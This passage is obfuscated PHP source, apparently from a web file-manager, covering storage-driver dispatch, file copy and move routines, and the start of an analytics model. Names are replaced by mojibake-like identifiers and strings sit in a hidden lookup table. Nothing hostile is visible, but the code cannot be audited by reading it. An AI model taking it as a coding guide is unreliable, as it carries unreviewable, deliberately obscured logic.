addslashes($Ãéßó÷½Âœ); $Ãéßó÷½Âœ = str_replace(array($ûàªÛÓ‰°[1070], $ûàªÛÓ‰°[229]), array($ûàªÛÓ‰°[1071], $ûàªÛÓ‰°[1072]), $Ãéßó÷½Âœ); $ê›‰±Å[] = str_replace($ûàªÛÓ‰°[55], $ûàªÛÓ‰°[1073], $Ãéßó÷½Âœ); } return $ûàªÛÓ‰°[55] . implode($ûàªÛÓ‰°[1074], $ê›‰±Å) . $ûàªÛÓ‰°[55]; } private function sqlDecode($¦âÊÇ¶ˆ, $Ò‡’ÒŠ×ÚœÎÆ) { $‹ÖËÓ¤ =& $_SERVER[ÀÆ]; $¦âÊÇ¶ˆ = str_replace(array($‹ÖËÓ¤[1071], $‹ÖËÓ¤[1072]), array($‹ÖËÓ¤[1070], $‹ÖËÓ¤[229]), $¦âÊÇ¶ˆ); if ($Ò‡’ÒŠ×ÚœÎÆ == $‹ÖËÓ¤[9]) { $¦âÊÇ¶ˆ = stripslashes($¦âÊÇ¶ˆ); } return $¦âÊÇ¶ˆ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($Âª, $Ï”) { $öˆ‹Ö =& $_SERVER[ÀÆ]; $§¨õ‚ìÏ§óØş = $Ï”; $GLOBALS[$öˆ‹Ö[1075]] = $öˆ‹Ö[1076] . $Âª; Hook::trigger($öˆ‹Ö[1076] . $Âª . $öˆ‹Ö[1077], $§¨õ‚ìÏ§óØş); $šÍÜ = self::driverMake($Ï”[0]); if (method_exists($šÍÜ, $Âª)) { $¤‘€ÏáêËş– = @call_user_func_array(array($šÍÜ, $Âª), $Ï”); } else { if (method_exists($šÍÜ, $öˆ‹Ö[1078])) { $¤‘€ÏáêËş– = @call_user_func_array(array($šÍÜ, $Âª), $Ï”); } else { if (method_exists(self, $Âª)) { $¤‘€ÏáêËş– = @call_user_func_array(array(self, $Âª), $Ï”); } else { $¤‘€ÏáêËş– = call_user_func_array(array(parent, $Âª), $Ï”); } } } Hook::trigger($öˆ‹Ö[1076] . $Âª . $öˆ‹Ö[1079], $§¨õ‚ìÏ§óØş, $¤‘€ÏáêËş–); return $¤‘€ÏáêËş–; } public static function init($·ç‹¥Î£Áù) { return self::driverMake($·ç‹¥Î£Áù); } public static function copy($Õú È, $²°ŸÖ, $½×å±ÒñŒ = false, $şˆşñ = false) { return self::copyMoveStart($Õú È, $²°ŸÖ, $½×å±ÒñŒ, $_SERVER[ÀÆ][543], $şˆşñ); } public static function move($ÒÇïÆÕÑ¡¯‚ª, $ñÑØªƒ–¹ä, $ˆéú = false, $¼é¹Šâó = false) { return self::copyMoveStart($ÒÇïÆÕÑ¡¯‚ª, $ñÑØªƒ–¹ä, $ˆéú, $_SERVER[ÀÆ][545], $¼é¹Šâó); } private static function copyMoveStart($›ıÊ¥¢—Å±¶Ÿ, $®ßØ, $‚Å’õ•°¦, $Èº¾ºœöêøÉ„, $èæÒ¡ò¤) { $×Å =& $_SERVER[ÀÆ]; $®’ = array($›ıÊ¥¢—Å±¶Ÿ, $®ßØ, $‚Å’õ•°¦, $èæÒ¡ò¤); Hook::trigger($×Å[1076] . $Èº¾ºœöêøÉ„ . $×Å[1077], $®’); $›İŠã = self::copyMove($›ıÊ¥¢—Å±¶Ÿ, $®ßØ, $‚Å’õ•°¦, $Èº¾ºœöêøÉ„, $èæÒ¡ò¤); Hook::trigger($×Å[1076] . $Èº¾ºœöêøÉ„ . $×Å[1079], $®’, $›İŠã); return $›İŠã; } public static function saveFile($êöÎ¦«÷Íıç‰, $Û©, $ëÅ¥ù = true) { $ Ä =& $_SERVER[ÀÆ]; $é‘äÃí‡ö = self::info($Û©); $ø´¸°¶ = self::driverMake($êöÎ¦«÷Íıç‰); $¯€Ø·Š = self::driverMake($Û©); $¯ç–™¸æ = !1; if ($¯€Ø·Š->pathParse[$ Ä[1080]]) { $¯ç–™¸æ = $¯€Ø·Š; $€¤ = $¯€Ø·Š->pathParse[$ Ä[1080]]; $¯€Ø·Š = self::driverMake($€¤); } if ($ø´¸°¶->pathParse[$ Ä[1080]]) { $ê£Ó¡›‰ü± = $ø´¸°¶->pathParse[$ Ä[1080]]; $ø´¸°¶ = self::driverMake($ê£Ó¡›‰ü±); } $†‡Ä£ÎÎÄ™ = $¯€Ø·Š->pathFather($Û©); $²¨ = !0; if (!$ëÅ¥ù && self::driverIsSame($ø´¸°¶, $¯€Ø·Š)) { $²¨ = !1; } $ƒ¯äÏØ· = self::copyFile($ø´¸°¶, $êöÎ¦«÷Íıç‰, $¯€Ø·Š, $†‡Ä£ÎÎÄ™, $é‘äÃí‡ö[$ Ä[28]], $²¨); if ($¯ç–™¸æ) { $ƒ¯äÏØ· = $¯ç–™¸æ->getPathOuter($ƒ¯äÏØ·); } return $ƒ¯äÏØ·; } private static function copyMove($ş‚¶, $»ŞÔÃ‡¨—­, $÷´å°îÃ…Ñ¸š, $»±Ÿ‰, $ç‘Ü³³ã = false) { $ÉÆ =& $_SERVER[ÀÆ]; if (!$ş‚¶ || $ş‚¶ == $ÉÆ[8] || !$»ŞÔÃ‡¨—­) { return !1; } ignore_timeout(); $•™á© = self::driverMake($ş‚¶); $Êí¯ = self::driverMake($»ŞÔÃ‡¨—­); $õÁª÷Ó¿öÑŞ = $»±Ÿ‰ == $ÉÆ[545]; $ã‰å’Ù¿ = !1; if ($Êí¯->pathParse[$ÉÆ[1080]]) { $ã‰å’Ù¿ = $Êí¯; $»ŞÔÃ‡¨—­ = $Êí¯->pathParse[$ÉÆ[1080]]; $Êí¯ = self::driverMake($»ŞÔÃ‡¨—­); } if ($•™á©->pathParse[$ÉÆ[1080]]) { $ş‚¶ = $•™á©->pathParse[$ÉÆ[1080]]; $•™á© = self::driverMake($ş‚¶); } self::check($•™á©, $ş‚¶, $Êí¯, $»ŞÔÃ‡¨—­); Hook::trigger($ÉÆ[73], $•™á©, $ş‚¶, $Êí¯, $»ŞÔÃ‡¨—­); $§Æ­Š‹Û = self::driverIsSame($•™á©, $Êí¯); if ($§Æ­Š‹Û) { if ($»±Ÿ‰ == $ÉÆ[545] && !method_exists($Êí¯, $ÉÆ[1081]) && trim($»ŞÔÃ‡¨—­, $ÉÆ[8]) == trim($Êí¯->pathFather($ş‚¶), $ÉÆ[8])) { if ($•™á©->pathThis($ş‚¶) != $ç‘Ü³³ã && !$•™á©->isTypeObject()) { return $•™á©->rename($ş‚¶, $ç‘Ü³³ã); } return $Êí¯->getPathOuter($ş‚¶); } if (method_exists($Êí¯, $»±Ÿ‰)) { return $Êí¯->{$»±Ÿ‰}($ş‚¶, $»ŞÔÃ‡¨—­, $÷´å°îÃ…Ñ¸š); } } $ïş³ØîĞÄ‹ = $•™á©->isFile($ş‚¶); if (!$ïş³ØîĞÄ‹ && $Êí¯->getType() == $ÉÆ[743] && $•™á©->getType() == $ÉÆ[106]) { $Õıù½­¼ = $Êí¯->copyFolderFromIO($•™á©, $ş‚¶, $»ŞÔÃ‡¨—­, $÷´å°îÃ…Ñ¸š, $õÁª÷Ó¿öÑŞ, $ç‘Ü³³ã); } else { $Õıù½­¼ = self::copyPath($•™á©, $ş‚¶, $Êí¯, $»ŞÔÃ‡¨—­, $÷´å°îÃ…Ñ¸š, $õÁª÷Ó¿öÑŞ, $ïş³ØîĞÄ‹, $ç‘Ü³³ã); } if ($Õıù½­¼ && $õÁª÷Ó¿öÑŞ) { $•™á©->remove($ş‚¶); } if ($ã‰å’Ù¿) { $Õıù½­¼ = $ã‰å’Ù¿->getPathOuter($Õıù½­¼); } return $Õıù½­¼; } private static function check($°¨¼ñÎÇ»Ñ¿, $¿¤, $’·ô…‹ê³ï, &$¦ÛÌæÂ) { $©… =& $_SERVER[ÀÆ]; if (self::driverIsSame($°¨¼ñÎÇ»Ñ¿, $’·ô…‹ê³ï) && $°¨¼ñÎÇ»Ñ¿->isFolder($¿¤) && $°¨¼ñÎÇ»Ñ¿->isParentOf($¿¤, $¦ÛÌæÂ)) { show_json(LNG($©…[1082]), !1); } if (!$°¨¼ñÎÇ»Ñ¿->exist($¿¤)) { show_json(LNG($©…[105]), !1); } } private static function copyPath($¶¤Ø, $şÅ˜à, $®¼§Æƒ¼, $ı÷Í¹¡×§ÎÒ, $ƒŒ, $¾‚½ŒçÜ´Ü, $ı°¯»ü, $„÷½€ = false) { $‰ëÊĞ…­…¯ =& $_SERVER[ÀÆ]; $¼¤‹—¨¨¥ = empty($„÷½€) && $„÷½€ !== $‰ëÊĞ…­…¯[191] ? $¶¤Ø->pathThis($şÅ˜à) : $„÷½€; if ($ƒŒ) { $÷¦…¼¥‰ = $®¼§Æƒ¼->fileNameExist($ı÷Í¹¡×§ÎÒ, $¼¤‹—¨¨¥); $¼¤‹—¨¨¥ = $®¼§Æƒ¼->fileNameAuto($ı÷Í¹¡×§ÎÒ, $¼¤‹—¨¨¥, $ƒŒ, !$ı°¯»ü); $ƒŒ = $÷¦…¼¥‰ ? $ƒŒ : !1; } if ($ı°¯»ü) { return self::copyFile($¶¤Ø, $şÅ˜à, $®¼§Æƒ¼, $ı÷Í¹¡×§ÎÒ, $¼¤‹—¨¨¥, $¾‚½ŒçÜ´Ü); } if ($ƒŒ == REPEAT_RENAME_FOLDER) { $ƒŒ = !1; } $™éĞÅ§ = rtrim($ı÷Í¹¡×§ÎÒ, $‰ëÊĞ…­…¯[8]) . $‰ëÊĞ…­…¯[8] . $¼¤‹—¨¨¥; $ü¦‡‚»ä = $®¼§Æƒ¼->mkdir($®¼§Æƒ¼->getPath($™éĞÅ§)); $ı÷Í¹¡×§ÎÒ = $®¼§Æƒ¼->getPathInner($ü¦‡‚»ä); $À÷Òõô°¢– = $¶¤Ø->listPath($şÅ˜à, !0); $À÷Òõô°¢– = is_array($À÷Òõô°¢–) ? $À÷Òõô°¢– : array($‰ëÊĞ…­…¯[74] => array(), $‰ëÊĞ…­…¯[75] => array()); $¶Éù¯úƒËä = array_merge($À÷Òõô°¢–[$‰ëÊĞ…­…¯[74]], $À÷Òõô°¢–[$‰ëÊĞ…­…¯[75]]); foreach ($¶Éù¯úƒËä as $íêÙú­ÊÏŞ) { $±Æ¶Ğ©¢…©Òá = $íêÙú­ÊÏŞ[$‰ëÊĞ…­…¯[29]] == $‰ëÊĞ…­…¯[193]; $şÅ˜à = $¶¤Ø->getPathInner($íêÙú­ÊÏŞ[$‰ëÊĞ…­…¯[76]]); $Èà—î˜Ååüºñ = self::copyPath($¶¤Ø, $şÅ˜à, $®¼§Æƒ¼, $ı÷Í¹¡×§ÎÒ, $ƒŒ, $¾‚½ŒçÜ´Ü, $±Æ¶Ğ©¢…©Òá); if (!$Èà—î˜Ååüºñ) { IO::errorTips($‰ëÊĞ…­…¯[1083] . $şÅ˜à . $‰ëÊĞ…­…¯[67] . $ı÷Í¹¡×§ÎÒ); } } self::copyMoveKeepInfo($¶¤Ø, $şÅ˜à, $ü¦‡‚»ä); return $ü¦‡‚»ä; } private static function copyFile($¢Âøõ, $®áÚ—ĞÔÊ, $îÔŸ‹¥Õô¥, $±’£âğæó•Ì‘, $õì€·àÓ², $÷¯êí’ÊÜ) { $¥ûê« =& $_SERVER[ÀÆ]; $±’£âğæó•Ì‘ = $îÔŸ‹¥Õô¥->getPath(rtrim($±’£âğæó•Ì‘, $¥ûê«[8]) . $¥ûê«[8] . $õì€·àÓ²); $ğ’òßûô = $¥ûê«[1084] . time() . rand_string(5); Hook::trigger($¥ûê«[1085], $¢Âøõ, $®áÚ—ĞÔÊ, $îÔŸ‹¥Õô¥, $±’£âğæó•Ì‘, $õì€·àÓ², $ğ’òßûô); if (self::driverIsSame($¢Âøõ, $îÔŸ‹¥Õô¥)) { if ($÷¯êí’ÊÜ) { $Ù˜ÈÈĞæµ±ë = $îÔŸ‹¥Õô¥->moveFile($®áÚ—ĞÔÊ, $±’£âğæó•Ì‘); } else { $Ù˜ÈÈĞæµ±ë = $îÔŸ‹¥Õô¥->copyFile($®áÚ—ĞÔÊ, $±’£âğæó•Ì‘); } Hook::trigger($¥ûê«[1086], $¢Âøõ, $®áÚ—ĞÔÊ, $îÔŸ‹¥Õô¥, $±’£âğæó•Ì‘, $õì€·àÓ², $Ù˜ÈÈĞæµ±ë); self::copyMoveKeepInfo($¢Âøõ, $®áÚ—ĞÔÊ, $Ù˜ÈÈĞæµ±ë); return $Ù˜ÈÈĞæµ±ë; } $¤€â¶ÑÎÒ²ü = TEMP_FILES; if ($GLOBALS[$¥ûê«[6]][$¥ûê«[88]][$¥ûê«[787]]) { $¤€â¶ÑÎÒ²ü = $GLOBALS[$¥ûê«[6]][$¥ûê«[88]][$¥ûê«[787]]; } $Ÿ»œíßíüš¸ = $¤€â¶ÑÎÒ²ü; mk_dir($Ÿ»œíßíüš¸); $šß›ø×ñÌ = $Ÿ»œíßíüš¸ . $ğ’òßûô; $ì¯‡Ş™ = $šß›ø×ñÌ; $šß›ø×ñÌ = $¢Âøõ->download($®áÚ—ĞÔÊ, $šß›ø×ñÌ); $šß›ø×ñÌ = $¢Âøõ->iconvApp($šß›ø×ñÌ); if (substr($šß›ø×ñÌ, strlen($¤€â¶ÑÎÒ²ü)) == $¤€â¶ÑÎÒ²ü) { $÷¯êí’ÊÜ = !0; } $Ù˜ÈÈĞæµ±ë = $îÔŸ‹¥Õô¥->upload($±’£âğæó•Ì‘, $šß›ø×ñÌ, $÷¯êí’ÊÜ); self::remove($ì¯‡Ş™); Hook::trigger($¥ûê«[1086], $¢Âøõ, $®áÚ—ĞÔÊ, $îÔŸ‹¥Õô¥, $±’£âğæó•Ì‘, $õì€·àÓ², $Ù˜ÈÈĞæµ±ë); self::copyMoveKeepInfo($¢Âøõ, $®áÚ—ĞÔÊ, $Ù˜ÈÈĞæµ±ë); return $Ù˜ÈÈĞæµ±ë; } private static function copyMoveKeepInfo($ş§á, $²œ õŒ, $éµù) { if (!$éµù) { return; } $ˆÇ“…‹Æ = $ş§á->info($²œ õŒ); if (!is_array($ˆÇ“…‹Æ)) { return; } IO::setModifyTime($éµù, $ˆÇ“…‹Æ[$_SERVER[ÀÆ][84]]); } public static function pathFather($¤¼ÂÜÂ) { $ôÁì´š = IO::init($¤¼ÂÜÂ); $ïÒ¾êÃ«Ÿ = $ôÁì´š->pathFather($ôÁì´š->path); return $ôÁì´š->getPathOuter($ïÒ¾êÃ«Ÿ); } public static function fileOut($ÙŠ, $¬öÕÍÎÉÜßî¹ = false, $Æùãºçİ¶»ô = false, $Æ = '') { $ô°± = self::driverMake($ÙŠ); if ($ô°±->isFileOutServer()) { return $ô°±->fileOutServer($ÙŠ, $¬öÕÍÎÉÜßî¹, $Æùãºçİ¶»ô, $Æ); } return $ô°±->fileOut($ÙŠ, $¬öÕÍÎÉÜßî¹, $Æùãºçİ¶»ô, $Æ); } public static function fileOutImage($Íæ¡, $ÂĞ€ëÙ¯ë´ = 250) { $·³¬ƒ“Èûí = array(250, 600, 1200, 2000, 3000, 5000); for ($°µ = 0; $°µ < count($·³¬ƒ“Èûí); $°µ++) { if ($°µ == 0 && $ÂĞ€ëÙ¯ë´ <= $·³¬ƒ“Èûí[$°µ]) { $ÂĞ€ëÙ¯ë´ = $·³¬ƒ“Èûí[$°µ]; break; } else { if ($ÂĞ€ëÙ¯ë´ > $·³¬ƒ“Èûí[$°µ - 1] && $ÂĞ€ëÙ¯ë´ <= $·³¬ƒ“Èûí[$°µ]) { $ÂĞ€ëÙ¯ë´ = $·³¬ƒ“Èûí[$°µ]; break; } else { if ($°µ == count($·³¬ƒ“Èûí) - 1 && $ÂĞ€ëÙ¯ë´ > $·³¬ƒ“Èûí[$°µ]) { $ÂĞ€ëÙ¯ë´ = $·³¬ƒ“Èûí[$°µ]; break; } } } } $ñğ†½ = self::driverMake($Íæ¡); if ($ñğ†½->isFileOutServer()) { return $ñğ†½->fileOutImageServer($Íæ¡, $ÂĞ€ëÙ¯ë´); } return $ñğ†½->fileOutImage($Íæ¡, $ÂĞ€ëÙ¯ë´); } private static function driverIsSame($ú©ÌÃÛ¢æ‹, $Ğá¬) { $Ôöë  =& $_SERVER[ÀÆ]; $øŠû‹¿ŸÀû = $ú©ÌÃÛ¢æ‹->getType(); $¨‘˜üñ = $Ğá¬->getType(); if ($øŠû‹¿ŸÀû != $¨‘˜üñ) { return !1; } if ($øŠû‹¿ŸÀû == $Ôöë [743]) { return !0; } if ($øŠû‹¿ŸÀû == $Ôöë [106]) { return !0; } if ($ú©ÌÃÛ¢æ‹->pathDriver == $Ğá¬->pathDriver) { return !0; } return !1; } public static function copyUpdate($¿œˆ¶ÔÒÂ, $˜Õï) { $«œ•úì =& $_SERVER[ÀÆ]; if (!IO::exist($¿œˆ¶ÔÒÂ)) { return !1; } if (!IO::exist($˜Õï)) { IO::mkdir($˜Õï); } $é¬‰à÷¶Â = self::_listAll($¿œˆ¶ÔÒÂ); $«ÓÜ´ = self::_listAll($˜Õï); $óî– = array(); $»í½ÔüƒŒ« = array(); foreach ($é¬‰à÷¶Â as $ã©™ => $øƒ) { if (isset($«ÓÜ´[$ã©™])) { if ($øƒ[$«œ•úì[77]] == 1) { continue; } if ($«ÓÜ´[$ã©™][$«œ•úì[78]] == $øƒ[$«œ•úì[78]]) { continue; } } if ($øƒ[$«œ•úì[77]] == 1) { $»í½ÔüƒŒ«[] = $˜Õï . $«œ•úì[8] . $ã©™; continue; } $şìØ = strstr(trim($ã©™, $«œ•úì[8]), $«œ•úì[8]) ? get_path_father($ã©™) : $«œ•úì[33]; $óî–[] = array($«œ•úì[1087] => $øƒ[$«œ•úì[76]], $«œ•úì[1088] => rtrim($˜Õï, $«œ•úì[8]) . $«œ•úì[8] . $şìØ, $«œ•úì[1089] => $øƒ); } $Á‡§øƒ = array($«œ•úì[193] => $óî–, $«œ•úì[77] => $»í½ÔüƒŒ«); Hook::trigger($«œ•úì[1090], $¿œˆ¶ÔÒÂ, $˜Õï, $Á‡§øƒ); foreach ($»í½ÔüƒŒ« as $øƒ) { IO::mkdir($øƒ); } foreach ($óî– as $øƒ) { IO::copy($øƒ[$«œ•úì[1087]], $øƒ[$«œ•úì[1088]], REPEAT_REPLACE); } } private static function _listAll($–) { $¥ÏÈÜ´¹ÍâÔ =& $_SERVER[ÀÆ]; $– = KodIO::clear($–); $Œ¡ç§ = IO::listAll($–); foreach ($Œ¡ç§ as &$É²à) { $ŸÇ¯˜ŞÌÓ† = substr($É²à[$¥ÏÈÜ´¹ÍâÔ[76]], strlen($–)); $É²à[$¥ÏÈÜ´¹ÍâÔ[1091]] = trim($ŸÇ¯˜ŞÌÓ†, $¥ÏÈÜ´¹ÍâÔ[8]); } unset($É²à); return array_to_keyvalue($Œ¡ç§, $¥ÏÈÜ´¹ÍâÔ[1091]); } public static function fileSubstr($´ïÌ, $Ì¦§«Á´ùé, $“® = false) { $¬Æéµ =& $_SERVER[ÀÆ]; $Şº¯œ¦ = self::driverMake($´ïÌ); $·“Ñ›“¢ó = $Şº¯œ¦->size($´ïÌ); $©ò†ôà = $Ì¦§«Á´ùé; $ÖÜÜ­ò = $“®; if ($Ì¦§«Á´ùé < 0) { $Ì¦§«Á´ùé = $·“Ñ›“¢ó + $Ì¦§«Á´ùé; } if ($“® === !1) { $“® = $·“Ñ›“¢ó - $Ì¦§«Á´ùé; } if ($Ì¦§«Á´ùé + $“® > $·“Ñ›“¢ó) { $“® = $·“Ñ›“¢ó - $Ì¦§«Á´ùé; } if (!$·“Ñ›“¢ó && $Şº¯œ¦->getType() == $¬Æéµ[106] && !$Şº¯œ¦->exist($´ïÌ)) { throw new Exception($¬Æéµ[1092] . LNG($¬Æéµ[1093]) . $¬Æéµ[958] . get_path_this($´ïÌ) . $¬Æéµ[33]); } if ($“® <= 0) { return $¬Æéµ[33]; } if ($Ì¦§«Á´ùé < 0 || $Ì¦§«Á´ùé >= $·“Ñ›“¢ó || $“® > 1024 * 1024 * 10) { throw new Exception("\146\151\x6c\145\x52\145\x61\x64\40\145\x72\x72\157\x72\x21\x20\163\x74\141\162\x74\75{$Ì¦§«Á´ùé}\x3b\x6c\x65\x6e\147\164\x68\x3d{$“®}\73\40\x73\151\172\x65\75{$·“Ñ›“¢ó}\x3b"); } $ÊÅ¥© = $Şº¯œ¦->fileSubstr($´ïÌ, $Ì¦§«Á´ùé, $“®); if (!$ÊÅ¥© && $“® && isset($GLOBALS[$¬Æéµ[1094]])) { throw new Exception($GLOBALS[$¬Æéµ[1094]][$¬Æéµ[1095]]); } return $ÊÅ¥©; } private static function driverMake(&$ÆÅ¸ş†Ö£„’) { $†¬ş‡¯€ =& $_SERVER[ÀÆ]; $„Ô›éÃ®Úø¾ = KodIO::parse($ÆÅ¸ş†Ö£„’); if (!self::$driverListSystem) { $§êğºÙ = Model($†¬ş‡¯€[752])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($§êğºÙ, $†¬ş‡¯€[395]); } if ($„Ô›éÃ®Úø¾[$†¬ş‡¯€[29]] == KodIO::KOD_IO && !self::$driverListSystem[$„Ô›éÃ®Úø¾[$†¬ş‡¯€[395]]]) { return !1; } $ÆÅ¸ş†Ö£„’ = $„Ô›éÃ®Úø¾[$†¬ş‡¯€[1096]]; $½²îÖ‡ØÃÑ = self::driverGet($„Ô›éÃ®Úø¾, $ÆÅ¸ş†Ö£„’); return $½²îÖ‡ØÃÑ; } private static function driverGet($Äƒáåê, &$»íÄ†Æö†¾) { $ê¤ÑÂ…ä =& $_SERVER[ÀÆ]; $ş˜Å¼äšÆì = $Äƒáåê[$ê¤ÑÂ…ä[1097]]; $ŠÓÕ÷ = $Äƒáåê[$ê¤ÑÂ…ä[395]]; switch ($Äƒáåê[$ê¤ÑÂ…ä[29]]) { case KodIO::KOD_IO: $Ã½ = self::$driverListSystem[$ŠÓÕ÷]; break; case KodIO::KOD_SOURCE: $»íÄ†Æö†¾ = $ŠÓÕ÷ . $»íÄ†Æö†¾; $Ã½ = array($ê¤ÑÂ…ä[1098] => $ê¤ÑÂ…ä[1099], $ê¤ÑÂ…ä[6] => $Äƒáåê); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $‚ÊĞŠÇÉáÕã = $GLOBALS[$ê¤ÑÂ…ä[1100]]; self::$driverListUser = array_to_keyvalue($‚ÊĞŠÇÉáÕã, $ê¤ÑÂ…ä[395]); } $Ã½ = self::$driverListUser[$ŠÓÕ÷]; break; case KodIO::KOD_SHARE_LINK: $Ã½ = array($ê¤ÑÂ…ä[1098] => $ê¤ÑÂ…ä[1101], $ê¤ÑÂ…ä[6] => $Äƒáåê); $†ú = Action($ê¤ÑÂ…ä[1102])->sharePathInfo($Äƒáåê[$ê¤ÑÂ…ä[76]]); $»íÄ†Æö†¾ = $†ú[$ê¤ÑÂ…ä[397]]; if (!$†ú[$ê¤ÑÂ…ä[397]]) { $šÇØ¼ = Model($ê¤ÑÂ…ä[589])->getInfo($†ú[$ê¤ÑÂ…ä[482]]); $»íÄ†Æö†¾ = KodIO::clear($šÇØ¼[$ê¤ÑÂ…ä[1103]] . $Äƒáåê[$ê¤ÑÂ…ä[1096]]); $Äƒáåê[$ê¤ÑÂ…ä[480]] = $šÇØ¼; $Äƒáåê[$ê¤ÑÂ…ä[1080]] = $»íÄ†Æö†¾; $Ã½ = array($ê¤ÑÂ…ä[1098] => $ê¤ÑÂ…ä[1104], $ê¤ÑÂ…ä[6] => $Äƒáåê); } break; case KodIO::KOD_SHARE_ITEM: $Ã½ = array($ê¤ÑÂ…ä[1098] => $ê¤ÑÂ…ä[1105], $ê¤ÑÂ…ä[6] => $Äƒáåê); $šÇØ¼ = Model($ê¤ÑÂ…ä[589])->getInfo($Äƒáåê[$ê¤ÑÂ…ä[395]]); if ($šÇØ¼[$ê¤ÑÂ…ä[397]] == $ê¤ÑÂ…ä[191]) { $»íÄ†Æö†¾ = KodIO::clear($šÇØ¼[$ê¤ÑÂ…ä[1103]] . $Äƒáåê[$ê¤ÑÂ…ä[1096]]); $Äƒáåê[$ê¤ÑÂ…ä[480]] = $šÇØ¼; $Äƒáåê[$ê¤ÑÂ…ä[1080]] = $»íÄ†Æö†¾; $Ã½ = array($ê¤ÑÂ…ä[1098] => $ê¤ÑÂ…ä[1106], $ê¤ÑÂ…ä[6] => $Äƒáåê); } else { if (!$»íÄ†Æö†¾) { $»íÄ†Æö†¾ = $šÇØ¼[$ê¤ÑÂ…ä[397]]; } } break; default: $»íÄ†Æö†¾ = $Äƒáåê[$ê¤ÑÂ…ä[76]]; $Ã½ = array($ê¤ÑÂ…ä[1098] => $ê¤ÑÂ…ä[1107]); break; } $µø = $Äƒáåê[$ê¤ÑÂ…ä[76]]; if (!isset(self::$driverCache[$µø])) { $Û®ê—§ = strtolower($Ã½[$ê¤ÑÂ…ä[94]]); $áÆİóƒ = $GLOBALS[$ê¤ÑÂ…ä[6]][$ê¤ÑÂ…ä[88]][$ê¤ÑÂ…ä[818]]; $Ã”Øù±Ê•³Íí = $ê¤ÑÂ…ä[72] . (isset($áÆİóƒ[$Û®ê—§]) ? $áÆİóƒ[$Û®ê—§] : ucfirst($Û®ê—§)); if (!class_exists($Ã”Øù±Ê•³Íí)) { show_json("{$Ã”Øù±Ê•³Íí}\x20\x6e\157\x74\40\145\x78\x69\x73\x74\x73\41", !1); } $ÇÏ = isset($Ã½[$ê¤ÑÂ…ä[6]]) ? $Ã½[$ê¤ÑÂ…ä[6]] : !1; self::$driverCache[$µø] = new $Ã”Øù±Ê•³Íí($ÇÏ); } $—¤÷Ò = self::$driverCache[$µø]; $—¤÷Ò->pathDriver = $ş˜Å¼äšÆì; $—¤÷Ò->pathBase = $ê¤ÑÂ…ä[33]; if (isset($Ã½[$ê¤ÑÂ…ä[6]][$ê¤ÑÂ…ä[1108]])) { $—¤÷Ò->pathBase = rtrim($Ã½[$ê¤ÑÂ…ä[6]][$ê¤ÑÂ…ä[1108]], $ê¤ÑÂ…ä[8]) . $ê¤ÑÂ…ä[8]; $»íÄ†Æö†¾ = $—¤÷Ò->pathBase . ltrim($»íÄ†Æö†¾, $ê¤ÑÂ…ä[8]); } $»íÄ†Æö†¾ = $—¤÷Ò->getPath($»íÄ†Æö†¾); if (isset($Äƒáåê[$ê¤ÑÂ…ä[1080]])) { $»íÄ†Æö†¾ = $Äƒáåê[$ê¤ÑÂ…ä[1080]]; } $—¤÷Ò->path = $»íÄ†Æö†¾; return $—¤÷Ò; } public static function errorTips($ÍŸ¶¿… = false) { $¿Ú¸ÙÍ«€ æ =& $_SERVER[ÀÆ]; static $ ‰Æ©Á› = array(); $ÊÕåŸ‰ = 1000; if ($ÍŸ¶¿… === -1) { return $ ‰Æ©Á› ? $ ‰Æ©Á›[count($ ‰Æ©Á›) - 1] : $¿Ú¸ÙÍ«€ æ[33]; } if ($ÍŸ¶¿… === !1) { return implode($¿Ú¸ÙÍ«€ æ[229], $ ‰Æ©Á›); } if (count($ ‰Æ©Á›) >= $ÊÕåŸ‰) { $ ‰Æ©Á› = array_slice($ ‰Æ©Á›, $ÊÕåŸ‰ * 0.5, $ÊÕåŸ‰); } $ ‰Æ©Á›[] = $ÍŸ¶¿…; write_log($¿Ú¸ÙÍ«€ æ[160] . ACTION . $¿Ú¸ÙÍ«€ æ[1109] . $ÍŸ¶¿…, $¿Ú¸ÙÍ«€ æ[1110]); } public static function getLastError($şíøôà°Ê = '') { $¢ö = self::errorTips(-1); return $¢ö ? $¢ö : $şíøôà°Ê; } } goto cºÄ¨‘Âª—; f¹ùÅİ·¥: class AnalysisModel extends ModelBaseLight { public function init($‹ƒê›») { $ÉÄˆ¨ =& $_SERVER[ÀÆ]; $´çÌşÁûá = array($ÉÄˆ¨[588] => array($ÉÄˆ¨[29] => $ÉÄˆ¨[1667], $ÉÄˆ¨[271] => array($ÉÄˆ¨[222], $ÉÄˆ¨[750], $ÉÄˆ¨[1668], $ÉÄˆ¨[1669])), $ÉÄˆ¨[1670] => array($ÉÄˆ¨[29] => $ÉÄˆ¨[1671], $ÉÄˆ¨[271] => array($ÉÄˆ¨[222], $ÉÄˆ¨[748], $ÉÄˆ¨[1672], $ÉÄˆ¨[1673], $ÉÄˆ¨[1674]))); if (!isset($´çÌşÁûá[$‹ƒê›»])) { return !1; } $this->optionType = $´çÌşÁûá[$‹ƒê›»][$ÉÄˆ¨[29]]; $this->field = $´çÌşÁûá[$‹ƒê›»][$ÉÄˆ¨[271]]; return !0; } public function listData($àœÛ¢ = false, $¤›íÓ = "\x6d\157\144\x69\146\171\x54\151\x6d\x65", $€¬ = false) { return parent::listData($àœÛ¢, $¤›íÓ, $€¬); } public function trendList($¦ØÆÄ„) { $Ò„± =& $_SERVER[ÀÆ]; $’úè = $this->listData(); if ($’úè) { $ì¤œÜ–ùÁç = end($’úè); $ÎœÌ™Æî¹Ê = date($Ò„±[1675], strtotime($Ò„±[1676])); if ($ì¤œÜ–ùÁç[$Ò„±[222]] == $ÎœÌ™Æî¹Ê) { return $’úè; } $‡³Ë®®Ÿ = strtotime($ì¤œÜ–ùÁç[$Ò„±[222]]); } if (!isset($‡³Ë®®Ÿ)) { $à‡…®áÕ = $¦ØÆÄ„ == $Ò„±[588] ? $Ò„±[532] : $Ò„±[817]; $‡³Ë®®Ÿ = Model($à‡…®áÕ)->min($Ò„±[194]); } $æ”ˆòÀ”™ = $Ò„±[1677] . ucfirst($¦ØÆÄ„); $¡‰öÈó = $this->dateList($‡³Ë®®Ÿ); foreach ($¡‰öÈó as $ÎœÌ™Æî¹Ê) { $this->{$æ”ˆòÀ”™}($ÎœÌ™Æî¹Ê); } return $this->listData(); } private function dateList($øğÉ‰¶¯Ù ) { $È´Ì•Û§­Í— =& $_SERVER[ÀÆ]; $Áƒ–¹¤€—Ï  = $øğÉ‰¶¯Ù ; 